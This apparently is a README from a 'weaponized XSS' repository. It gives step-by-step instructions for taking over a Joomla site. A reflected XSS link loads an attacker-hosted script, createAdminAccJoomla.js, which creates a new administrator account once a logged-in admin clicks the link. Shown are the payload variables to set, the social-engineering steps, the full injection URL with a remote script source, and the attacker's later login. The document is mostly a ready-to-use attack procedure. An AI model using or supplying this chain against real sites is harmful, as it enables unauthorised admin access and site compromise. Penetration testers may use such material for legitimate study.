# [authn] Create New Admin User (ATO)

## Test Environment

### Web Browsers (20250426)

* [x] Mozilla Firefox 137.0.2 (64-bit)
* [x] Google Chrome 135.0.7049.115 (64-bit)
* [x] Microsoft Edge 135.0.3179.98 (64-bit)

## Exploitation Steps

1. [setup exploit] change payload variable values (`createAdminAccJoomla.js`)

    `newAccUser` - username of the user account to be created

    `newAccPass` - password of the user account to be created (**NOTE**: minimum password length is 12 characters)

    `newAccEmail` - email of the user account to be created

    `joomlaRoot` - path to Joomla installation on the target system (e.g. `"/joomla"`)

2. [setup exploit] setup web server (to serve the payload)

3. [social engineering attack] victim user (with administrative privileges) logs in

    http://192.168.5.19/administrator

4. [social engineering attack] victim user clicks link

    ```
    http://192.168.5.19/rxss.php?q=<script src=http://192.168.5.5/createAdminAccJoomla.js></script>
    ```

    * **NOTES**:
      * `192.168.5.19` - target Joomla site
      * `192.168.5.5` - web server hosting the payload

5. [post exploit] attacker logs into target Joomla site using specified credentials

    http://192.168.5.19/administrator/

## Screenshot

* **NOTE**: the screenshot covers steps 1 to 4 from the "Exploitation Steps" chapter

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/Joomla/CreateNewAdmin/screenshots/Joomla_-_create_new_admin_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/Joomla/CreateNewAdmin/screenshots/Joomla_-_create_new_admin_-_1-1.png">
    </picture>
  </kbd>
</p>

## Video

https://github.com/user-attachments/assets/5276712b-9124-479b-9e7c-be783178d47a
